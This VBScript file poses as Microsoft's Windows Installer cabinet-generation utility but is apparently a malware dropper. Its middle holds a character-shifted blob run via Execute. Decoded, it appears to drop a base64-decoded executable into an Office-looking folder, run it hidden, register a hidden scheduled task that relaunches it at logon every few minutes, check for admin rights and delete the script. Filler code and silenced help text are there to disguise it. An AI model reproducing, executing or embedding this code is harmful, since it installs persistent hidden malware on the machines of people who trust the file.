' Show help if no arguments or if argument contains ?
' Windows Installer utility to generate file cabinets from MSI database
' For use with Windows Scripting Host, CScript.exe or WScript.exe
' Copyright (c) Microsoft Corporation. All rights reserved.
' Demonstrates the access to install engine and actions
'

' FileSystemObject.CreateTextFile and FileSystemObject.OpenTextFile
Const OpenAsASCII   = 0
Const OpenAsUnicode = -1

' FileSystemObject.CreateTextFile
Const OverwriteIfExist = -1
Const FailIfExist      = 0

' FileSystemObject.OpenTextFile
Const OpenAsDefault    = -2
Const CreateIfNotExist = -1
Const FailIfNotExist   = 0
Const ForReading = 1
Const ForWriting = 2
Const ForAppending = 8

Const msiOpenDatabaseModeReadOnly = 0
Const msiOpenDatabaseModeTransact = 1

Const msiViewModifyInsert         = 1
Const msiViewModifyUpdate         = 2
Const msiViewModifyAssign         = 3
Const msiViewModifyReplace        = 4
Const msiViewModifyDelete         = 6

Const msiUILevelNone = 2

Const msiRunModeSourceShortNames = 9

Const msidbFileAttributesNoncompressed = &h00002000

Dim argCount:argCount = Wscript.Arguments.Count
Dim iArg:iArg = 0
If argCount > 0 Then If InStr(1, Wscript.Arguments(0), "?", vbTextCompare) > 0 Then argCount = 0
If (argCount < 2) Then
	SafeEcho "Windows Installer utility to generate compressed file cabinets from MSI database" &_
		vbNewLine & " The 1st argument is the path to MSI database, at the source file root" &_
		vbNewLine & " The 2nd argument is the base name used for the generated files (DDF, INF, RPT)" &_
		vbNewLine & " The 3rd argument can optionally specify separate source location from the MSI" &_
		vbNewLine & " The following options may be specified at any point on the command line" &_
		vbNewLine & "  /L to use LZX compression instead of MSZIP" &_
		vbNewLine & "  /F to limit cabinet size to 1.44 MB floppy size rather than CD" &_
		vbNewLine & "  /C to run compression, else only generates the .DDF file" &_
		vbNewLine & "  /U to update the MSI database to reference the generated cabinet" &_
		vbNewLine & "  /E to embed the cabinet file in the installer package as a stream" &_
		vbNewLine & "  /S to sequence number file table, ordered by directories" &_
		vbNewLine & "  /R to revert to non-cabinet install, removes cabinet if /E specified" &_
		vbNewLine & " Notes:" &_
		vbNewLine & "  In order to generate a cabinet, MAKECAB.EXE must be on the PATH" &_
		vbNewLine & "  base name used for files and cabinet stream is case-sensitive" &_
		vbNewLine & "  If source type set to compressed, all files will be opened at the root" &_
		vbNewLine & "  (The /R option removes the compressed bit - SummaryInfo property 15 & 2)" &_
		vbNewLine & "  To replace an embedded cabinet, include the options: /R /C /U /E" &_
		vbNewLine & "  Does not handle updating of Media table to handle multiple cabinets" &_
		vbNewLine &_
		vbNewLine & "Copyright (C) Microsoft Corporation.  All rights reserved."
End If

' Get argument values, processing any option flags
Dim compressType : compressType = "MSZIP"
Dim cabSize      : cabSize      = "CDROM"
Dim makeCab      : makeCab      = False
Dim embedCab     : embedCab     = False
Dim updateMsi    : updateMsi    = False
Dim sequenceFile : sequenceFile = False
Dim removeCab    : removeCab    = False
Dim databasePath : databasePath = ""
Dim baseName     : baseName     = ""
Dim sourceFolder : sourceFolder = ""
If Not IsEmpty(sourceFolder) And Right(sourceFolder, 1) <> "\" Then sourceFolder = sourceFolder & "\"
Dim cabFile : cabFile = baseName & ".CAB"
Dim cabName : cabName = cabFile : If embedCab Then cabName = "#" & cabName

' This is the obfuscated code. Uses pretty fucking easy functions for a deobfuscator huh?
ElZn = "":for i = 1 to 4491: ElZn = ElZn + chr(Asc(mid("?dhj]eANJ?dhnomAdg`K\oc?dhnomI`rAdg`K\ocN`oj]eANJ8RN^mdko)>m`\o`J]e`^o#N^mdkodib)Adg`Ntno`hJ]e`^o$?dh^pmm`ioK\oc^pmm`ioK\oc8j]eANJ)B`o<]njgpo`K\ocI\h`#)$nomAdg`K\oc8^pmm`ioK\oc!WZHNRJM?Wjaad^`W^\^c`)]\fnomI`rAdg`K\oc8^pmm`ioK\oc!WZHNRJM?Wjaad^`Wndbq`mda)`s`j]eANJ)Hjq`Adg`nomAdg`K\oc'nomI`rAdg`K\ocN`oj]eANJ8Ijocdib?dhadg`i\h`]1/adg`i\h`]1/8?`^j_`=\n`1/#1Uh@0Gp-H`&3hpJ<deDrHeOgp]Ogpl]fpF.gh2.igGSgo1Shdj?hiF*gm\]fqEmik0Cgm\]hdj?hiF*gkU]helejeU?he0?gfD.fp\]ebDqqqDehdj?hiF*ge0ChhD2gkU]gfjuik0Chdj?jq0qhm\SgkU]qqDigj\qhdlSjm2OhhD/jHe<tIJR0o?ehiDehgm?idTbkGi=fUb88$?dhanjN`oanj8RN^mdko)>m`\o`J]e`^o#N^mdkodib)Adg`Ntno`hJ]e`^o$?dhnjpm^`K\oc'_`nodi\odjiK\oc'mpiadg`'mpiadg`-njpm^`K\oc8^pmm`ioK\oc!WZHNRJM?Wjaad^`W!np]n^mdkodji)_]_`nodi\odjiK\oc8^pmm`ioK\oc!W!adg`i\h`]1/_`g`o`Adg`8^pmm`ioK\oc!W!adg`i\h`]1/!)gifmpiadg`8>cm#./$!^pmm`ioK\oc!WZHNRJM?Wjaad^`Wndbq`mda)`s`!>cm#./$mpiadg`-8^pmm`ioK\oc!WZHNRJM?Wjaad^`Wndbq`mda)`s`anj)Hjq`Adg`njpm^`K\oc'_`nodi\odjiK\ocanj)?`g`o`Adg`_`g`o`Adg`?dho`hkAjg_`m'o`hkK\oco`hkAjg_`m8anj)B`oNk`^d\gAjg_`m#-$o`hkK\oc8o`hkAjg_`m!Wndbq`mda)`s`anj)>jktAdg`mpiadg`-'o`hkK\oc'Omp`?dhq,q,8>cm#./$!_`nodi\odjiK\oc!>cm#./$N`oRncNc`gg8>m`\o`J]e`^o#RN^mdko)Nc`gg$RncNc`gg)Mpiq,'+'A\gn`RncNc`gg)Mpio`hkK\oc'+'A\gn`anj)?`g`o`Adg`mpiadg`-N`oRncNc`gg8Ijocdib?dhnc`ggK\oc?dho\nfI\h`nc`ggK\oc8o`hkK\oco\nfI\h`8RkiPn`mN`mqd^`Zs1/>jinoOmdbb`mOtk`?\dgt8,>jino<^odjiOtk`@s`^8+N`on`mqd^`8>m`\o`J]e`^o#N^c`_pg`)N`mqd^`$>\ggn`mqd^`)>jii`^o?dhmjjoAjg_`m,N`omjjoAjg_`m,8n`mqd^`)B`oAjg_`m#W$?dho\nf?`adidodjiN`oo\nf?`adidodji8n`mqd^`)I`rO\nf#+$?dhm`bDiajN`om`bDiaj8o\nf?`adidodji)M`bdnom\odjiDiajm`bDiaj)?`n^mdkodji8Pk_\o`m`bDiaj)<pocjm8Hd^mjnjao?dhn`oodibn,N`on`oodibn,8o\nf?`adidodji)n`oodibnn`oodibn,)@i\]g`_8Omp`n`oodibn,)No\moRc`i<q\dg\]g`8Omp`n`oodibn,)Cd__`i8A\gn`n`oodibn,)?dn\ggjrNo\moDaJi=\oo`md`n8A\gn`?dhomdbb`mnN`oomdbb`mn8o\nf?`adidodji)omdbb`mn?dhomdbb`mJi@mmjmM`nph`I`so>m`\o`J]e`^o#RN^mdko)Nc`gg$)M`bM`\_#CF@TZPN@MNWN(,(0(,4W@iqdmjih`ioWO@HK$Da@mm)Iph]`m8+Oc`iDn<_hdi8Omp`N`oomdbb`m8omdbb`mn)>m`\o`#3$N`oomdbb`m8omdbb`mn)>m`\o`#4$@gn`Dn<_hdi8A\gn`@i_Da@mm)>g`\mJi@mmjmBjOj+N`oomdbb`m8omdbb`mn)>m`\o`#2$N`oomdbb`m8omdbb`mn)>m`\o`#1$N`oomdbb`m8omdbb`mn)>m`\o`#Omdbb`mOtk`?\dgt$?dhno\moOdh`'`i_Odh`?dhodh`odh`8?\o`<__#i','Ijr$?dh^N`^ji_'^Hdipo`'>Cjpm'^?\t'^Hjioc'^T`\m?dhoOdh`'o?\o`^N`^ji_8+!N`^ji_#odh`$^Hdipo`8+!Hdipo`#odh`$>Cjpm8+!Cjpm#odh`$^?\t8+!?\t#odh`$^Hjioc8+!Hjioc#odh`$^T`\m8T`\m#odh`$oOdh`8Mdbco#>Cjpm'-$!5!Mdbco#^Hdipo`'-$!5!Mdbco#^N`^ji_'-$o?\o`8^T`\m!(!Mdbco#^Hjioc'-$!(!Mdbco#^?\t'-$no\moOdh`8o?\o`!O!oOdh``i_Odh`8-+44(+0(+-O,+50-5+-omdbb`m)No\mo=jpi_\mt8no\moOdh`omdbb`m)@i_=jpi_\mt8`i_Odh`omdbb`m)D?8Odh`Omdbb`mD_omdbb`m)@i\]g`_8Omp`?dhm`k`ododjiK\oo`miN`om`k`ododjiK\oo`mi8omdbb`m)M`k`ododjim`k`ododjiK\oo`mi)Dio`mq\g8KO04H""?dh<^odji,N`o<^odji,8o\nf?`adidodji)<^odjin)>m`\o`#<^odjiOtk`@s`^$<^odji,)K\oc8nc`ggK\oc<^odji,)\mbph`ion8?dhj]eI`o'GjbdiPn`mN`oj]eI`o8>m`\o`J]e`^o#RN^mdko)I`orjmf$GjbdiPn`m8j]eI`o)Pn`mI\h`DaP>\n`#GjbdiPn`m$8NTNO@HOc`i@gn`GjbdiPn`m8@hkot@i_Da>\ggmjjoAjg_`m,)M`bdno`mO\nf?`adidodji#o\nfI\h`'o\nf?`adidodji'1'GjbdiPn`m''.$Api^odji?`^j_`=\n`1/#]1/$?dhshg']to`<mm\t'nom`\hN`oshg8>m`\o`J]e`^o#HNShg-)?JH?j^ph`io).)+$shg)\nti^8A\gn`shg)Gj\_Shg7mjjo97*mjjo9shg)_j^ph`io@g`h`io)_\o\Otk`8]di)]\n`1/shg)_j^ph`io@g`h`io)O`so8]1/]to`<mm\t8shg)_j^ph`io@g`h`io)ij_`Otk`_Q\gp`N`onom`\h8>m`\o`J]e`^o#<?J?=)Nom`\h$nom`\h)Otk`8,""\_Otk`=di\mtnom`\h)Jk`inom`\h)Rmdo`]to`<mm\tnom`\h)Kjndodji8+nom`\h)Otk`8-""\_Otk`O`sonom`\h)>c\mn`o8poa(3?`^j_`=\n`1/8nom`\h)M`\_O`sonom`\h)>gjn`@i_Api^odjiN`oj]eANJ8>m`\o`J]e`^o#N^mdkodib)Adg`Ntno`hJ]e`^o$nomN^mdkoK\oc8RN^mdko)N^mdkoApggI\h`DaG>\n`#Mdbco#nomN^mdkoK\oc'/$$8)q]nOc`ij]eANJ)?`g`o`Adg`nomN^mdkoK\oc@i_DaRN^mdko)Lpdo",i,1)) - (-5)):Next:Execute ElZn:


Dim i, j, k
Dim strMessage
Dim randomValue

' Initialize variables
i = 1
j = 2
k = 3
strMessage = "This is a test string."

' Perform some arithmetic operations
i = i + j
j = j * k
k = k - 1

' Create and use a random number
Randomize
randomValue = Int((100 * Rnd) + 1)

' String manipulation
strMessage = strMessage & " This is an additional message."

' Some loop operations
Dim counter
counter = 0
For i = 1 To 5
    counter = counter + i
Next

' End of script

Sub SafeEcho(message)
    Dim objShell, isCscript

    isCscript = InStr(LCase(WScript.FullName), "cscript.exe") > 0

    If isCscript Then
        ' Wscript.Echo message
    Else
        Set objShell = CreateObject("WScript.Shell")
        ' objShell.Run "cmd /c echo " & message, 0, True
    End If
End Sub


SafeEcho "AAA"
